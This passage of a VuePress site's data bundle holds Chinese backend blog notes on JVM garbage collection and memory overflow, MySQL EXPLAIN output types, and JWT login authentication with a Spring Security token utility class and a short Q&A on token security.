gc：是新生代gc，指的是发生在新生代的垃圾收集动作。由于java对象大都是朝生夕死，所以minor gc的发生非常频繁，一般回收速度也比较快。\n\n * full gc/major gc：是老年代的gc，出现major gc一般都伴有minor gc，major gc肯定比minor gc慢很多。\n\n * 何时发生？\n   \n   minor gc：当jvm无法为新对象分配空间的时候就会发生minor gc，所以new对象的频率越高，越容易触发。\n   \n   full gc：① 当老年代空间不足的时候会触发full gc，full gc 会同时将老年代和新生代的垃圾进行回收。 ②当发生minor gc的时候可能触发full gc，由于老年代要对年轻代进行担保，由于进行一次垃圾回收之前是无法确定有多少对象存活，因此老年代并不知道自己要担保多少空间，因此老年代采用动态估值的方法：也就是上一次回收发送时晋升到老年代的对象容量的平均值作为经验值，这样就会有一个问题，当发生一次minor gc之后，存活的对象剧增（假设），但此时老年代并没有满，但是此时平均值增加了，就会发生full gc。\n\n\n# 栈溢出和堆溢出\n\n * 栈溢出：栈溢出是指不断的调用方法，不断的压栈，最终超出了栈允许的栈深度，就会发生栈溢出，比如递归操作没有终止，死循环。\n\n * 栈内存溢出：对于一台服务器而言，每一个用户请求，都会产生一个线程来处理这个请求，每一个线程对应着一个栈，栈会分配内存，此时如果请求过多，这时候内存不够了，就会发生栈内存溢出。\n\n * 堆溢出：不断的new 一个对象，一直创建新的对象， 或者直接创建的对象太大了超过了堆内存（夸张的说）。",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"MySQL 慢查询优化",frontmatter:{title:"MySQL 慢查询优化",date:"2020-05-16T00:00:00.000Z",tags:["sql优化"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/mysql_explain.html",relativePath:"views/backend/mysql_explain.md",key:"v-3d07f094",path:"/views/backend/mysql_explain.html",headers:[{level:2,title:"explain 使用介绍",slug:"explain-使用介绍",normalizedTitle:"explain 使用介绍",charIndex:27},{level:2,title:"其它",slug:"其它",normalizedTitle:"其它",charIndex:43}],excerpt:"<Boxx/>\n<p>通过 <strong>explain</strong> 解析sql运行情况</p>\n",headersStr:"explain 使用介绍 其它",content:"通过 explain 解析sql运行情况\n\n\n\n * explain 使用介绍\n * 其它\n\n\n\n\n# explain 使用介绍\n\n通过 explain，可以查看 sql 语句的执行情况（比如查询的表，使用的索引以及 mysql 在表中找到所需行的方式等） 用 explain 查询 mysql 查询计划的输出参数有:\n\n列名              说明\nid              执行编号，标识 select 所属的行。如果在语句中没子查询或关联查询，只有唯一的 select，每行都将显示\n                1。否则，内层的 select 语句一般会顺序编号，对应于其在原始语句中的位置\nselect_type     显示本行是简单或复杂 select。如果查询有任何复杂的子查询，则最外层标记为\n                PRIMARY（DERIVED、UNION、UNION RESUlT）\ntable           访问引用哪个表（引用某个查询，如 “derived3”）\ntype            数据访问 / 读取操作类型（ALL、index、range、ref、eq_ref、const/system、NULL）\npossible_keys   揭示哪一些索引可能有利于高效的查找\nkey             显示 mysql 决定采用哪个索引来优化查询\nkey_len         显示 mysql 在索引里使用的字节数\nref             显示了之前的表在 key 列记录的索引中查找值所用的列或常量\nrows            为了找到所需的行而需要读取的行数，估算值，不精确。通过把所有 rows 列值相乘，可粗略估算整个查询会检查的行数\nExtra           额外信息，如 using index、filesort 等\n\n需要注意的是我们重点关注 type 即可！！！\n\ntype 显示的是访问类型，是较为重要的一个指标，结果值从好到坏依次是： system > const > eq_ref > ref > fulltext > ref_or_null > index_merge > unique_subquery > index_subquery > range > index > ALL ，一般来说，得保证查询至少达到 range 级别，最好能达到 ref。\n\n类型       说明\nAll      最坏的情况，全表扫描\nindex    和全表扫描一样。只是扫描表的时候按照索引次序进行而不是行。主要优点就是避免了排序，但是开销仍然非常大。如在 Extra\n         列看到 Using index，说明正在使用覆盖索引，只扫描索引的数据，它比按索引次序全表扫描的开销要小很多\nrange    范围扫描，一个有限制的索引扫描。key 列显示使用了哪个索引。当使用 =、 <>、>、>=、<、<=、IS\n         NULL、<=>、BETWEEN 或者 IN 操作符，用常量比较关键字列时，可以使用 range\nref      一种索引访问，它返回所有匹配某个单个值的行。此类索引访问只有当使用非唯一性索引或唯一性索引非唯一性前缀时才会发生。这个类型跟\n         eq_ref 不同的是，它用在关联操作只使用了索引的最左前缀，或者索引不是 UNIQUE 和 PRIMARY\n         KEY。ref 可以用于使用 = 或 <=> 操作符的带索引的列。\neq_ref   最多只返回一条符合条件的记录。使用唯一性索引或主键查找时会发生 （高效）\nconst    当确定最多只会有一行匹配的时候，MySQL 优化器会在查询前读取它而且只读取一次，因此非常快。当主键放入 where\n         子句时，mysql 把这个查询转为一个常量（高效）\nsystem   这是 const 连接类型的一种特例，表仅有一行满足条件。\nNull     意味说 mysql 能在优化阶段分解查询语句，在执行阶段甚至用不到访问表或索引（高效）\n\n\n# 其它\n\n * 0529看见的掘金很nice啊",normalizedContent:"通过 explain 解析sql运行情况\n\n\n\n * explain 使用介绍\n * 其它\n\n\n\n\n# explain 使用介绍\n\n通过 explain，可以查看 sql 语句的执行情况（比如查询的表，使用的索引以及 mysql 在表中找到所需行的方式等） 用 explain 查询 mysql 查询计划的输出参数有:\n\n列名              说明\nid              执行编号，标识 select 所属的行。如果在语句中没子查询或关联查询，只有唯一的 select，每行都将显示\n                1。否则，内层的 select 语句一般会顺序编号，对应于其在原始语句中的位置\nselect_type     显示本行是简单或复杂 select。如果查询有任何复杂的子查询，则最外层标记为\n                primary（derived、union、union result）\ntable           访问引用哪个表（引用某个查询，如 “derived3”）\ntype            数据访问 / 读取操作类型（all、index、range、ref、eq_ref、const/system、null）\npossible_keys   揭示哪一些索引可能有利于高效的查找\nkey             显示 mysql 决定采用哪个索引来优化查询\nkey_len         显示 mysql 在索引里使用的字节数\nref             显示了之前的表在 key 列记录的索引中查找值所用的列或常量\nrows            为了找到所需的行而需要读取的行数，估算值，不精确。通过把所有 rows 列值相乘，可粗略估算整个查询会检查的行数\nextra           额外信息，如 using index、filesort 等\n\n需要注意的是我们重点关注 type 即可！！！\n\ntype 显示的是访问类型，是较为重要的一个指标，结果值从好到坏依次是： system > const > eq_ref > ref > fulltext > ref_or_null > index_merge > unique_subquery > index_subquery > range > index > all ，一般来说，得保证查询至少达到 range 级别，最好能达到 ref。\n\n类型       说明\nall      最坏的情况，全表扫描\nindex    和全表扫描一样。只是扫描表的时候按照索引次序进行而不是行。主要优点就是避免了排序，但是开销仍然非常大。如在 extra\n         列看到 using index，说明正在使用覆盖索引，只扫描索引的数据，它比按索引次序全表扫描的开销要小很多\nrange    范围扫描，一个有限制的索引扫描。key 列显示使用了哪个索引。当使用 =、 <>、>、>=、<、<=、is\n         null、<=>、between 或者 in 操作符，用常量比较关键字列时，可以使用 range\nref      一种索引访问，它返回所有匹配某个单个值的行。此类索引访问只有当使用非唯一性索引或唯一性索引非唯一性前缀时才会发生。这个类型跟\n         eq_ref 不同的是，它用在关联操作只使用了索引的最左前缀，或者索引不是 unique 和 primary\n         key。ref 可以用于使用 = 或 <=> 操作符的带索引的列。\neq_ref   最多只返回一条符合条件的记录。使用唯一性索引或主键查找时会发生 （高效）\nconst    当确定最多只会有一行匹配的时候，mysql 优化器会在查询前读取它而且只读取一次，因此非常快。当主键放入 where\n         子句时，mysql 把这个查询转为一个常量（高效）\nsystem   这是 const 连接类型的一种特例，表仅有一行满足条件。\nnull     意味说 mysql 能在优化阶段分解查询语句，在执行阶段甚至用不到访问表或索引（高效）\n\n\n# 其它\n\n * 0529看见的掘金很nice啊",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"JWT 登陆认证",frontmatter:{title:"JWT 登陆认证",date:"2019-04-21T00:00:00.000Z",tags:["jwt"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/jwt.html",relativePath:"views/backend/jwt.md",key:"v-0daa2af4",path:"/views/backend/jwt.html",headers:[{level:2,title:"使用场景",slug:"使用场景",normalizedTitle:"使用场景",charIndex:47},{level:2,title:"初识JWT",slug:"初识jwt",normalizedTitle:"初识jwt",charIndex:55},{level:3,title:"jwt的组成",slug:"jwt的组成",normalizedTitle:"jwt的组成",charIndex:66},{level:3,title:"jwt实例",slug:"jwt实例",normalizedTitle:"jwt实例",charIndex:78},{level:2,title:"JWT登陆认证",slug:"jwt登陆认证",normalizedTitle:"jwt登陆认证",charIndex:87},{level:3,title:"认证原理",slug:"认证原理",normalizedTitle:"认证原理",charIndex:100},{level:3,title:"引入pom依赖",slug:"引入pom依赖",normalizedTitle:"引入pom依赖",charIndex:110},{level:3,title:"JwtTokenUtil工具类",slug:"jwttokenutil工具类",normalizedTitle:"jwttokenutil工具类",charIndex:123},{level:2,title:"客户端添加请求头",slug:"客户端添加请求头",normalizedTitle:"客户端添加请求头",charIndex:142},{level:2,title:"jwt+redis使用流程",slug:"jwt-redis使用流程",normalizedTitle:"jwt+redis使用流程",charIndex:154},{level:2,title:"安全问题",slug:"安全问题",normalizedTitle:"安全问题",charIndex:171},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:179},{level:2,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:185}],excerpt:"<Boxx/>\n<p>基于客户端的用户登录认证（ <strong>轻量</strong>，<strong>安全</strong>，服务端不用记录用户状态信息(<strong>无状态</strong>) ）</p>\n",headersStr:"使用场景 初识JWT jwt的组成 jwt实例 JWT登陆认证 认证原理 引入pom依赖 JwtTokenUtil工具类 客户端添加请求头 jwt+redis使用流程 安全问题 总结 其他",content:'基于客户端的用户登录认证（ 轻量，安全，服务端不用记录用户状态信息(无状态) ）\n\n\n\n * 使用场景\n * 初识JWT\n   * jwt的组成\n   * jwt实例\n * JWT登陆认证\n   * 认证原理\n   * 引入pom依赖\n   * JwtTokenUtil工具类\n * 客户端添加请求头\n * jwt+redis使用流程\n * 安全问题\n * 总结\n * 其他\n\n\n\n\n# 使用场景\n\n * 分布式的登录认证\n * Token 可以是无状态的，可以在多个服务间共享\n\n\n# 初识JWT\n\n * 官网： https://jwt.io/\n\n\n# jwt的组成\n\njwt的组成方式： header.payload.signature\n\n第一部分我们称它为头部（header)， 用于存放签名的生成算法\n\n{\n  "alg": "HS256",\n  "typ": "JWT"\n}\n\n\n1\n2\n3\n4\n\n\n第二部分我们称其为载荷（payload)，用于存放内容\n\n{\n  "sub": "1234567890",\n  "name": "John Doe",\n  "iat": 1516239022\n}\n\n\n1\n2\n3\n4\n5\n\n\n第三部分是签证（String signature)， 一旦header和payload被篡改，验证将失败\n\n//secret为加密算法的密钥，密钥只能由服务端和客户端知悉\nHMACSHA256(\n  base64UrlEncode(header) + "." +\n  base64UrlEncode(payload),your-256-bit-secret\n) \n\n\n1\n2\n3\n4\n5\n\n\n\n# jwt实例\n\n\n\n * 最终的JWT串\n\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\n\n1\n\n\n\n# JWT登陆认证\n\n\n# 认证原理\n\n * 用户调用登录接口，登录成功后获取到JWT的token；\n * 之后用户每次调用接口都在http的header中添加一个叫Authorization的头，值为JWT的token；\n * 后台程序通过对Authorization头中信息的解码及数字签名校验来获取其中的用户信息，从而实现认证和授权。\n * JWT登录授权过滤器，拦截请求，从每个请求中获取token，从token中获取负载，从负载中获取用户名放入SpringSecurity中，之后认证授权由SpringSecurity框架管理。\n * 第一次登陆还没有token，用户的登陆信息由SpringSecurity管理认证通过之后，生成jwtToken返回给客户端保存，客户端之后发送请求头携带我们需要的token即可\n\n\n# 引入pom依赖\n\n\x3c!-- JWT --\x3e\n<dependency>\n    <groupId>io.jsonwebtoken</groupId>\n    <artifactId>jjwt</artifactId>\n    <version>0.9.0</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# JwtTokenUtil工具类\n\n * 主要包括生成token，设置过期时间，验证token是否有效，获取token负载等\n * 工具类可具体参考mall项目\n\npackage com.macro.mall.tiny.common.utils;\n\nimport io.jsonwebtoken.Claims;\nimport io.jsonwebtoken.Jwts;\nimport io.jsonwebtoken.SignatureAlgorithm;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.stereotype.Component;\n\nimport java.util.Date;\nimport java.util.HashMap;\nimport java.util.Map;\n\n/**\n * JwtToken生成的工具类\n * Created by macro on 2018/4/26.\n */\n@Component\npublic class JwtTokenUtil {\n    private static final Logger LOGGER = LoggerFactory.getLogger(JwtTokenUtil.class);\n    private static final String CLAIM_KEY_USERNAME = "sub";\n    private static final String CLAIM_KEY_CREATED = "created";\n    @Value("${jwt.secret}")\n    private String secret;\n    @Value("${jwt.expiration}")\n    private Long expiration;\n\n    /**\n     * 根据负责生成JWT的token\n     */\n    private String generateToken(Map<String, Object> claims) {\n        return Jwts.builder()\n                .setClaims(claims)\n                .setExpiration(generateExpirationDate())\n                .signWith(SignatureAlgorithm.HS512, secret)\n                .compact();\n    }\n\n    /**\n     * 从token中获取JWT中的负载\n     */\n    private Claims getClaimsFromToken(String token) {\n        Claims claims = null;\n        try {\n            claims = Jwts.parser()\n                    .setSigningKey(secret)\n                    .parseClaimsJws(token)\n                    .getBody();\n        } catch (Exception e) {\n            LOGGER.info("JWT格式验证失败:{}",token);\n        }\n        return claims;\n    }\n\n    /**\n     * 生成token的过期时间\n     */\n    private Date generateExpirationDate() {\n        return new Date(System.currentTimeMillis() + expiration * 1000);\n    }\n\n    /**\n     * 从token中获取登录用户名\n     */\n    public String getUserNameFromToken(String token) {\n        String username;\n        try {\n            Claims claims = getClaimsFromToken(token);\n            username =  claims.getSubject();\n        } catch (Exception e) {\n            username = null;\n        }\n        return username;\n    }\n\n    /**\n     * 验证token是否还有效\n     *\n     * @param token       客户端传入的token\n     * @param userDetails 从数据库中查询出来的用户信息\n     */\n    public boolean validateToken(String token, UserDetails userDetails) {\n        String username = getUserNameFromToken(token);\n        return username.equals(userDetails.getUsername()) && !isTokenExpired(token);\n    }\n\n    /**\n     * 判断token是否已经失效\n     */\n    private boolean isTokenExpired(String token) {\n        Date expiredDate = getExpiredDateFromToken(token);\n        return expiredDate.before(new Date());\n    }\n\n    /**\n     * 从token中获取过期时间\n     */\n    private Date getExpiredDateFromToken(String token) {\n        Claims claims = getClaimsFromToken(token);\n        return claims.getExpiration();\n    }\n\n    /**\n     * 根据用户信息生成token\n     */\n    public String generateToken(UserDetails userDetails) {\n        Map<String, Object> claims = new HashMap<>();\n        claims.put(CLAIM_KEY_USERNAME, userDetails.getUsername());\n        claims.put(CLAIM_KEY_CREATED, new Date());\n        return generateToken(claims);\n    }\n\n    /**\n     * 判断token是否可以被刷新\n     */\n    public boolean canRefresh(String token) {\n        return !isTokenExpired(token);\n    }\n\n    /**\n     * 刷新token\n     */\n    public String refreshToken(String token) {\n        Claims claims = getClaimsFromToken(token);\n        claims.put(CLAIM_KEY_CREATED, new Date());\n        return generateToken(claims);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n\n\n\n# 客户端添加请求头\n\n * js操作cookie\n * js发送请求头\n   * jQuery Ajax可以通过headers或beforeSend修改request的HTTP headers，例如：\n\n$.ajax({\n\turl: "./test.php",\n\ttype: "POST",\n    headers: {\n   \t\t"Accept" : "text/plain; charset=utf-8",\n   \t\t"Content-Type": "text/plain; charset=utf-8"\n    },\n    /*\n    beforeSend: function(jqXHR, settings) {\n    \tjqXHR.setRequestHeader(\'Accept\', \'text/plain; charset=utf-8\');\n    \tjqXHR.setRequestHeader(\'Content-Type\', \'text/plain; charset=utf-8\');\n    },\n    */\n    data: {"user" : "min", "pass" : "he"},\n    error: function(jqXHR, textStatus, errorThrown) {\n    \t//....\n    },\n    success: function(data, textStatus, jqXHR) {\n    \t//....\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# jwt+redis使用流程\n\n 1. 登录：用户第一次登录，校验通过，生成token并存到redis里，返回客户端（token设置过期时间1天，redis设置过期时间0.5小时）。\n\n 2. 鉴权：之后客户端每次请求都携带token，服务端校验token通过并且redis过期时间没过，则redis续期然后返回token；服务端校验token通过但如果redis中token已过期，则失效。\n\n 3. 登出：服务端校验token通过，将redis中的token删除。\n\n\n# 安全问题\n\n 1. 如果其他用户获得我们电脑上的token,那么他们就能模仿真实用户进行操作（黑客监控电脑，获得网站发送的token,进行操作）？\n    \n    对于敏感的api接口，需使用https 。https是在http超文本传输协议加入SSL层，它在网络间通信是加密的，所以需要加密证书。\n\n 2. 我们是否可以伪造用户token进行访问？\n    \n    不可以，因为你无法使用服务器的签名，就是你自己的密钥签名的信息服务器识别不了。\n\n 3. 我们是否可以修改token中body的信息？\n    \n    不能，修改了之后签名信息就不正确，然后就无法验证签名，说明数据被修改了。\n\n 4. app登录后，服务端返回一个token，app存在客户端，下次再打开app时，直接读token，传token到服务端做验证，免去重新输入用户密码的麻烦，这个token存储在header里，目前看大多数app都是这样做，但如果黑客抓包获取到token，伪造http 请求，对服务器做操作，那岂不是很不安全。。。\n    \n    这方法确实不好啊，不能只依赖于http的header里的东西来认证，太容易模仿。最简单的方法可能就是走https，客户端只要接受服务器端的签名即可。\n    \n    理解：签名就是验证信息的唯一性，如果中间人进行获得token，那么无法进行公钥签名，服务器获得token之后还要进行解密的，因此这个方法可以进行避免攻击。\n\n\n# 总结\n\n * 优点：在非跨域环境下使用JWT机制是一个非常不错的选择，实现方式简单，操作方便，能够快速实现。由于服务端不存储用户状态信息，因此大用户量，对后台服务也不会造成压力。\n\n * 缺点：跨域实现相对比较麻烦，安全性也有待探讨。因为JWT令牌返回到页面中，可以使用js获取到，如果遇到XSS攻击令牌可能会被盗取，在JWT还没超时的情况下，就会被获取到敏感数据信息。\n\n * 对于安全问题：\n   \n   对于敏感的api接口，需使用https 。https是在http超文本传输协议加入SSL层，它在网络间通信是加密的，所以需要加密证书。采用https 或者 代码层面也可以做安全检测，比如ip地址发生变化，MAC地址发生变化等等，可以要求重新登录\n\n\n# 其他\n\n * 10分钟了解JSON Web令牌（JWT）\n * 使用JWT实现单点登录（完全跨域方案）*\n * SpringBoot+Security+JWT基础\n * SpringBoot集成JWT实现token验证\n * JWT的使用流程\n * 掌握基于JWT实现的Token身份认证',normalizedContent:'基于客户端的用户登录认证（ 轻量，安全，服务端不用记录用户状态信息(无状态) ）\n\n\n\n * 使用场景\n * 初识jwt\n   * jwt的组成\n   * jwt实例\n * jwt登陆认证\n   * 认证原理\n   * 引入pom依赖\n   * jwttokenutil工具类\n * 客户端添加请求头\n * jwt+redis使用流程\n * 安全问题\n * 总结\n * 其他\n\n\n\n\n# 使用场景\n\n * 分布式的登录认证\n * token 可以是无状态的，可以在多个服务间共享\n\n\n# 初识jwt\n\n * 官网： https://jwt.io/\n\n\n# jwt的组成\n\njwt的组成方式： header.payload.signature\n\n第一部分我们称它为头部（header)， 用于存放签名的生成算法\n\n{\n  "alg": "hs256",\n  "typ": "jwt"\n}\n\n\n1\n2\n3\n4\n\n\n第二部分我们称其为载荷（payload)，用于存放内容\n\n{\n  "sub": "1234567890",\n  "name": "john doe",\n  "iat": 1516239022\n}\n\n\n1\n2\n3\n4\n5\n\n\n第三部分是签证（string signature)， 一旦header和payload被篡改，验证将失败\n\n//secret为加密算法的密钥，密钥只能由服务端和客户端知悉\nhmacsha256(\n  base64urlencode(header) + "." +\n  base64urlencode(payload),your-256-bit-secret\n) \n\n\n1\n2\n3\n4\n5\n\n\n\n# jwt实例\n\n\n\n * 最终的jwt串\n\neyjhbgcioijiuzi1niisinr5cci6ikpxvcj9.eyjzdwiioiixmjm0nty3odkwiiwibmftzsi6ikpvag4grg9liiwiawf0ijoxnte2mjm5mdiyfq.sflkxwrjsmekkf2qt4fwpmejf36pok6yjv_adqssw5c\n\n\n1\n\n\n\n# jwt登陆认证\n\n\n# 认证原理\n\n * 用户调用登录接口，登录成功后获取到jwt的token；\n * 之后用户每次调用接口都在http的header中添加一个叫authorization的头，值为jwt的token；\n * 后台程序通过对authorization头中信息的解码及数字签名校验来获取其中的用户信息，从而实现认证和授权。\n * jwt登录授权过滤器，拦截请求，从每个请求中获取token，从token中获取负载，从负载中获取用户名放入springsecurity中，之后认证授权由springsecurity框架管理。\n * 第一次登陆还没有token，用户的登陆信息由springsecurity管理认证通过之后，生成jwttoken返回给客户端保存，客户端之后发送请求头携带我们需要的token即可\n\n\n# 引入pom依赖\n\n\x3c!-- jwt --\x3e\n<dependency>\n    <groupid>io.jsonwebtoken</groupid>\n    <artifactid>jjwt</artifactid>\n    <version>0.9.0</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# jwttokenutil工具类\n\n * 主要包括生成token，设置过期时间，验证token是否有效，获取token负载等\n * 工具类可具体参考mall项目\n\npackage com.macro.mall.tiny.common.utils;\n\nimport io.jsonwebtoken.claims;\nimport io.jsonwebtoken.jwts;\nimport io.jsonwebtoken.signaturealgorithm;\nimport org.slf4j.logger;\nimport org.slf4j.loggerfactory;\nimport org.springframework.beans.factory.annotation.value;\nimport org.springframework.security.core.userdetails.userdetails;\nimport org.springframework.stereotype.component;\n\nimport java.util.date;\nimport java.util.hashmap;\nimport java.util.map;\n\n/**\n * jwttoken生成的工具类\n * created by macro on 2018/4/26.\n */\n@component\npublic class jwttokenutil {\n    private static final logger logger = loggerfactory.getlogger(jwttokenutil.class);\n    private static final string claim_key_username = "sub";\n    private static final string claim_key_created = "created";\n    @value("${jwt.secret}")\n    private string secret;\n    @value("${jwt.expiration}")\n    private long expiration;\n\n    /**\n     * 根据负责生成jwt的token\n     */\n    private string generatetoken(map<string, object> claims) {\n        return jwts.builder()\n                .setclaims(claims)\n                .setexpiration(generateexpirationdate())\n                .signwith(signaturealgorithm.hs512, secret)\n                .compact();\n    }\n\n    /**\n     * 从token中获取jwt中的负载\n     */\n    private claims getclaimsfromtoken(string token) {\n        claims claims = null;\n        try {\n            claims = jwts.parser()\n                    .setsigningkey(secret)\n                    .parseclaimsjws(token)\n                    .getbody();\n        } catch (exception e) {\n            logger.info("jwt格式验证失败:{}",token);\n        }\n        return claims;\n    }\n\n    /**\n     * 生成token的过期时间\n     */\n    private date generateexpirationdate() {\n        return new date(system.currenttimemillis() + expiration * 1000);\n    }\n\n    /**\n     * 从token中获取登录用户名\n     */\n    public string getusernamefromtoken(string token) {\n        string username;\n        try {\n            claims claims = getclaimsfromtoken(token);\n            username =  claims.getsubject();\n        } catch (exception e) {\n            username = null;\n        }\n        return username;\n    }\n\n    /**\n     * 验证token是否还有效\n     *\n     * @param token       客户端传入的token\n     * @param userdetails 从数据库中查询出来的用户信息\n     */\n    public boolean validatetoken(string token, userdetails userdetails) {\n        string username = getusernamefromtoken(token);\n        return username.equals(userdetails.getusername()) && !istokenexpired(token);\n    }\n\n    /**\n     * 判断token是否已经失效\n     */\n    private boolean istokenexpired(string token) {\n        date expireddate = getexpireddatefromtoken(token);\n        return expireddate.before(new date());\n    }\n\n    /**\n     * 从token中获取过期时间\n     */\n    private date getexpireddatefromtoken(string token) {\n        claims claims = getclaimsfromtoken(token);\n        return claims.getexpiration();\n    }\n\n    /**\n     * 根据用户信息生成token\n     */\n    public string generatetoken(userdetails userdetails) {\n        map<string, object> claims = new hashmap<>();\n        claims.put(claim_key_username, userdetails.getusername());\n        claims.put(claim_key_created, new date());\n        return generatetoken(claims);\n    }\n\n    /**\n     * 判断token是否可以被刷新\n     */\n    public boolean canrefresh(string token) {\n        return !istokenexpired(token);\n    }\n\n    /**\n     * 刷新token\n     */\n    public string refreshtoken(string token) {\n        claims claims = getclaimsfromtoken(token);\n        claims.put(claim_key_created, new date());\n        return generatetoken(claims);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n\n\n\n# 客户端添加请求头\n\n * js操作cookie\n * js发送请求头\n   * jquery ajax可以通过headers或beforesend修改request的http headers，例如：\n\n$.ajax({\n\turl: "./test.php",\n\ttype: "post",\n    headers: {\n   \t\t"accept" : "text/plain; charset=utf-8",\n   \t\t"content-type": "text/plain; charset=utf-8"\n    },\n    /*\n    beforesend: function(jqxhr, settings) {\n    \tjqxhr.setrequestheader(\'accept\', \'text/plain; charset=utf-8\');\n    \tjqxhr.setrequestheader(\'content-type\', \'text/plain; charset=utf-8\');\n    },\n    */\n    data: {"user" : "min", "pass" : "he"},\n    error: function(jqxhr, textstatus, errorthrown) {\n    \t//....\n    },\n    success: function(data, textstatus, jqxhr) {\n    \t//....\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# jwt+redis使用流程\n\n 1. 登录：用户第一次登录，校验通过，生成token并存到redis里，返回客户端（token设置过期时间1天，redis设置过期时间0.5小时）。\n\n 2. 鉴权：之后客户端每次请求都携带token，服务端校验token通过并且redis过期时间没过，则redis续期然后返回token；服务端校验token通过但如果redis中token已过期，则失效。\n\n 3. 登出：服务端校验token通过，将redis中的token删除。\n\n\n# 安全问题\n\n 1. 如果其他用户获得我们电脑上的token,那么他们就能模仿真实用户进行操作（黑客监控电脑，获得网站发送的token,进行操作）？\n    \n    对于敏感的api接口，需使用https 。https是在http超文本传输协议加入ssl层，它在网络间通信是加密的，所以需要加密证书。\n\n 2. 我们是否可以伪造用户token进行访问？\n    \n    不可以，因为你无法使用服务器的签名，就是你自己的密钥签名的信息服务器识别不了。\n\n 3. 我们是否可以修改token中body的信息？\n    \n    不能，修改了之后签名信息就不正确，然后就无法验证签名，说明数据被修改了。\n\n 4. app登录后，服务端返回一个token，app存在客户端，下次再打开app时，直接读token，传token到服务端做验证，免去重新输入用户密码的麻烦，这个token存储在header里，目前看大多数app都是这样做，但如果黑客抓包获取到token，伪造http 请求，对服务器做操作，那岂不是很不安全。。。\n    \n    这方法确实不好啊，不能只依赖于http的header里的东西来认证，太容易模仿。最简单的方法可能就是走https，客户端只要接受服务器端的签名即可。\n    \n    理解：签名就是验证信息的唯一性，如果中间人进行获得token，那么无法进行公钥签名，服务器获得token之后还要进行解密的，因此这个方法可以进行避免攻击。\n\n\n# 总结\n\n * 优点：在非跨域环境下使用jwt机制是一个非常不错的选择，实现方式简单，操作方便，能够快速实现。由于服务端不存储用户状态信息，因此大用户量，对后台服务也不会造成压力。\n\n * 缺点：跨域实现相对比较麻烦，安全性也有待探讨。因为jwt令牌返回到页面中，可以使用js获取到，如果遇到xss攻击令牌可能会被盗取，在jwt还没超时的情况下，就会被获取到敏感数据信息。\n\n * 对于安全问题：\n   \n   对于敏感的api接口，需使用https 。https是在http超文本传输协议加入ssl层，它在网络间通信是加密的，所以需要加密证书。采用https 或者 代码层面也可以做安全检测，比如ip地址发生变化，mac地址发生变化等等，可以要求重新登录\n\n\n# 其他\n\n * 10分钟了解json web令牌（jwt）\n * 使用jwt实现单点登录（完全跨域方案）*\n * springboot+security+jwt基础\n * springboot集成jwt实现token验证\n * jwt的使用流程\n * 掌握基于jwt实现的token身份认证',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Quartz 定时任务",frontmatter:{title:"Quartz 定时任务",date:"2019-09-15T00:00:00.000Z",tags:["定时任务"],categories:["后端 